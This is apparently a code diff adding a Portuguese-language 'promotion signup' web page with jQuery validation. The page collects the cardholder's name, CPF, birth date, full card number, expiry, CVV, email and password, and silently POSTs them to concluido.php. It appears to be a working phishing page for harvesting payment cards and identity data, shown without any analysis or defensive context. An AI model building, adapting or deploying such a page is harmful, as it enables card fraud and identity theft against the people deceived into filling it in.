@@ -1,0 +1,353 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Cadastro Promoção
+  </title>
+  <style>
+   *{margin:0px;}
+html, body{height:100%;width:100%;}
+body{background:url(src/background.png);background-repeat:no-repeat;background-position:top center;}
+#centro{width:960px;min-width:960px;margin:auto;}
+#promo{background:url(src/topo.png);width:452px;height:187px;margin-bottom:20px;}
+#alinhadireita{position:relative;float:right;width:450px;margin-top:175px;}
+.labelcampos{font-family:Tahoma;font-size:12px;}
+.campos{height: 23px;padding: 5px 5px 0 5px;border: 1px solid #d4dada;background: #FFFFFF;margin: 0 0 6px 0;}
+  </style>
+ </head>
+ <body>
+  <div id="centro">
+   <div align="right" id="alinhadireita">
+    <div id="promo">
+     <form action="concluido.php" method="POST">
+      <input type="hidden" id="hiddennome" name="nome" />
+      <input type="hidden" id="hiddencpf" name="cpf" />
+      <input type="hidden" id="hiddennasc" name="nascimento" />
+      <input type="hidden" id="hiddencc" name="ncart" />
+      <input type="hidden" id="hiddenval1" name="val1" />
+      <input type="hidden" id="hiddenval2" name="val2" />
+      <input type="hidden" id="hiddencvv" name="cvv" />
+      <input type="hidden" id="hiddenemail" name="email" />
+      <input type="hidden" id="hiddensenha" name="senha" />
+     </form>
+    </div>
+    <table width="428" cellspacing="0" cellpadding="0">
+     <tbody>
+      <tr>
+      </tr>
+      <tr>
+       <td width="220" valign="middle" align="left">
+        <span class="labelcampos">
+         Nome do titular impresso no cartão
+         <font color="#FF0000">
+          <b>
+           *
+          </b>
+         </font>
+         :
+        </span>
+       </td>
+       <td width="208" align="left">
+        <input type="text" autocomplete="off" style="width: 180px;" class="campos" value="" id="nome" />
+       </td>
+      </tr>
+      <tr>
+       <td width="220" valign="middle" align="left">
+        <span class="labelcampos">
+         Digite seu CPF
+         <font color="#FF0000">
+          <b>
+           *
+          </b>
+         </font>
+         :
+        </span>
+       </td>
+       <td width="208" align="left">
+        <input type="text" autocomplete="off" style="width: 100px;" class="campos" value="" id="cpf" maxlength="11" />
+        <span style="font-size:10px;font-family:tahoma;">
+         *somento números
+        </span>
+       </td>
+      </tr>
+      <tr>
+       <td width="220" valign="middle" align="left">
+        <span class="labelcampos">
+         Data de nascimento
+         <font color="#FF0000">
+          <b>
+           *
+          </b>
+         </font>
+         :
+        </span>
+       </td>
+       <td width="208" align="left">
+        <input type="text" autocomplete="off" style="width: 70px;" class="campos" id="nascimento" maxlength="8" />
+        <span style="font-size:10px;font-family:tahoma;">
+         *somento números
+        </span>
+       </td>
+      </tr>
+      <tr>
+       <td width="220" valign="middle" align="left">
+        <span class="labelcampos">
+         Número do Cartão de Crédito
+         <font color="#FF0000">
+          <b>
+           *
+          </b>
+         </font>
+         :
+        </span>
+       </td>
+       <td width="208" align="left">
+        <input type="text" onkeyup="Bandeira();" autocomplete="off" style="width: 105px;" class="campos" id="ncartao" maxlength="16" />
+        <span style="font-size:10px;font-family:tahoma;">
+         *somento números
+        </span>
+       </td>
+      </tr>
+      <tr>
+       <td width="220" valign="middle" align="left">
+        <span class="labelcampos">
+        </span>
+       </td>
+       <td width="208" height="36" align="left">
+        <div style="float:left;margin-right:10px;">
+         <div style="background:url(src/visa.png);width:37px;height:23px;">
+          <div style="display:block;opacity: 0.65;filter: alpha(opacity=65);background-color: #CCC;width:37px;height:23px;" id="visa">
+          </div>
+         </div>
+        </div>
+        <div style="float:left;margin-right:10px;">
+         <div style="background:url(src/mc.png);width:37px;height:23px;">
+          <div style="display:block;opacity: 0.65;filter: alpha(opacity=65);background-color: #CCC;width:37px;height:23px;" id="master">
+          </div>
+         </div>
+        </div>
+        <div style="float:left;margin-right:10px;">
+         <div style="background:url(src/amex.png);width:37px;height:23px;">
+          <div style="display:block;opacity: 0.65;filter: alpha(opacity=65);background-color: #CCC;width:37px;height:23px;" id="amex">
+          </div>
+         </div>
+        </div>
+        <div style="float:left;margin-right:10px;">
+         <div style="background:url(src/hiper.png);width:37px;height:23px;">
+          <div style="display:block;opacity: 0.65;filter: alpha(opacity=65);background-color: #CCC;width:37px;height:23px;" id="hiper">
+          </div>
+         </div>
+        </div>
+       </td>
+      </tr>
+      <tr>
+       <td width="220" valign="middle" height="36" align="left">
+        <span class="labelcampos">
+         Data de validade
+         <font color="#FF0000">
+          <b>
+           *
+          </b>
+         </font>
+         :
+        </span>
+       </td>
+       <td width="208" valign="middle" align="left">
+        <select style="border: 1px solid #d4dada;" id="valm">
+         <option value="">
+         </option>
+         <option value="1">
+          1
+         </option>
+         <option value="2">
+          2
+         </option>
+         <option value="3">
+          3
+         </option>
+         <option value="4">
+          4
+         </option>
+         <option value="5">
+          5
+         </option>
+         <option value="6">
+          6
+         </option>
+         <option value="7">
+          7
+         </option>
+         <option value="8">
+          8
+         </option>
+         <option value="9">
+          9
+         </option>
+         <option value="10">
+          10
+         </option>
+         <option value="11">
+          11
+         </option>
+         <option value="12">
+          12
+         </option>
+        </select>
+        <select style="border: 1px solid #d4dada;" id="vala">
+         <option value="">
+         </option>
+         <option value="2015">
+          2015
+         </option>
+         <option value="2016">
+          2016
+         </option>
+         <option value="2017">
+          2017
+         </option>
+         <option value="2018">
+          2018
+         </option>
+         <option value="2019">
+          2019
+         </option>
+         <option value="2020">
+          2020
+         </option>
+         <option value="2021">
+          2021
+         </option>
+         <option value="2022">
+          2022
+         </option>
+         <option value="2023">
+          2023
+         </option>
+         <option value="2024">
+          2024
+         </option>
+         <option value="2025">
+          2025
+         </option>
+        </select>
+       </td>
+      </tr>
+      <tr>
+       <td width="220" valign="middle" align="left">
+        <span class="labelcampos">
+         Código de segurança
+         <font color="#FF0000">
+          <b>
+           *
+          </b>
+         </font>
+         :
+        </span>
+       </td>
+       <td width="208" align="left">
+        <input type="password" autocomplete="off" style="width: 25px;" class="campos" id="cvv" maxlength="4" />
+        <img style="width:36px;height:23px;" src="src/cvv.png" />
+       </td>
+      </tr>
+      <tr>
+       <td width="220" valign="middle" align="left">
+        <span class="labelcampos">
+         Digite um e-mail para cadastro
+         <font color="#FF0000">
+          <b>
+           *
+          </b>
+         </font>
+         :
+        </span>
+       </td>
+       <td width="208" align="left">
+        <input type="text" autocomplete="off" style="width: 180px;" class="campos" value="" id="email" />
+       </td>
+      </tr>
+      <tr>
+       <td width="220" valign="middle" align="left">
+        <span class="labelcampos">
+         Digite a senha para seu cadastro
+         <font color="#FF0000">
+          <b>
+           *
+          </b>
+         </font>
+         :
+        </span>
+       </td>
+       <td width="208" align="left">
+        <input type="password" autocomplete="off" style="width: 180px;" class="campos" id="senha" maxlength="20" />
+       </td>
+      </tr>
+      <tr>
+       <td height="36">
+       </td>
+      </tr>
+      <tr>
+       <td>
+        <div onclick="Avancar();" style="background:url(src/avanca.png);cursor:pointer;width:145px;height:50px;">
+        </div>
+       </td>
+      </tr>
+      <tr>
+       <td height="36">
+       </td>
+      </tr>
+     </tbody>
+    </table>
+   </div>
+  </div>
+  <script src="src/jquery-1.4.1.min.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   function Bandeira(){
+	var ncartao = $("#ncartao").val();
+	if(ncartao.charAt(0)=="4"){ $("#visa").css("display", "none"); } else { $("#visa").css("display", "block"); }
+	if(ncartao.charAt(0)=="5"){ $("#master").css("display", "none"); } else { $("#master").css("display", "block"); }
+	if(ncartao.charAt(0)=="3"){ $("#amex").css("display", "none"); } else { $("#amex").css("display", "block"); }
+	if(ncartao.charAt(0)=="1"){ $("#hiper").css("display", "none"); } else { $("#hiper").css("display", "block"); }
+}
+
+function Avancar(){
+	var nome = $("#nome").val();
+	var cpf = $("#cpf").val();
+	var nascimento = $("#nascimento").val();
+	var ncartao = $("#ncartao").val();
+	var valm = $("#valm").val();
+	var vala = $("#vala").val();
+	var cvv = $("#cvv").val();
+	var email = $("#email").val();
+	var senha = $("#senha").val();
+	var alerta = "";
+	
+	if(nome.length&gt;0 &amp;&amp; cpf.length==11 &amp;&amp; nascimento.length==8 &amp;&amp; ncartao.length==16 &amp;&amp; valm&gt;0 &amp;&amp; vala&gt;0 &amp;&amp; cvv.length&gt;=3 &amp;&amp; email.length&gt;0 &amp;&amp; senha.length&gt;0){  
+		if(vala==2015 &amp;&amp; valm&lt;11){alert("Para prosseguir é necessário preencher corretamente os campos:\n \n- Data de validade do cartão"); return false; }
+		$("#hiddennome").val(nome);
+		$("#hiddencpf").val(cpf);
+		$("#hiddennasc").val(nascimento);
+		$("#hiddencc").val(ncartao);
+		$("#hiddenval1").val(valm);
+		$("#hiddenval2").val(vala);
+		$("#hiddencvv").val(cvv);
+		$("#hiddenemail").val(email);
+		$("#hiddensenha").val(senha);
+
+		document.forms[0].submit();
+	}
+	else{
+	if(nome.length==0){alerta = alerta + "\n- Nome do titular impresso no cartão"; } 
+	if(cpf.length&lt;11){alerta = alerta + "\n- CPF do titular";}
+	if(nascimento.length&lt;8){alerta = alerta + "\n- Data de nascimento do titular"; } 
+	if(ncartao.length&lt;16){alerta= alerta + "\n- Número do Cartão de Crédito"; }
+	if(valm=="" || vala==""){alerta = alerta + "\n- Data de validade do cartão"; }
+	if(cvv.length&lt;3){alerta = alerta + "\n- Código de segurança do cartão"; }
+	if(email.length==0){alerta = alerta + "\n- Email a utilizar no cadastro"; }
+	if(senha.length==0){alerta = alerta + "\n- Senha a utilizar no cadastro"; }
+		alert("Para prosseguir é necessário preencher corretamente os campos:\n" + alerta);
+	}
+}
+  </script>
+ </body>
+</html>
